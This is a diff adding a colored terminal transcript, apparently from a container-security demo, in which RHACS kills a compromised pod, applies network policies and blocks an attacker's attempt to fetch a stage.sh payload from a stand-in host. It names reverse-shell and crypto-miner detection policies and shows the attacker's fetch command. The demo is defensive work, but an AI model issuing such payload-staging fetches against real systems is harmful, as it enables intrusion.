@@ -1,0 +1,11 @@
+
+[1m[35m━━━ ACT 5 — Respond: shrink the blast radius, then close the door ━━━[0m
+  [32m✓[0m KILL_POD enforcement ON: tdr-unauthorized-process tdr-reverse-shell tdr-crypto-miner tdr-file-drift
+
+[1m[31mattacker@internet[0m:[34m~[0m$ id[0m
+  uid=1000670000(1000670000) gid=0(root) groups=0(root),1000670000
+  [32m✓[0m pod blog-5457d7c75b-lqmzs KILLED by RHACS in seconds → replaced by clean blog-5457d7c75b-ccbtf
+  [32m✓[0m NetworkPolicies applied: tdr-blog-contain, tdr-payments-deny-all
+
+[1m[31mattacker@internet[0m:[34m~[0m$ fetch http://attacker.example.local:8080/stage.sh from inside the app itself (no shell, no new process)[0m
+  blocked: Get "http://attacker.example.local:8080/stage.sh": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
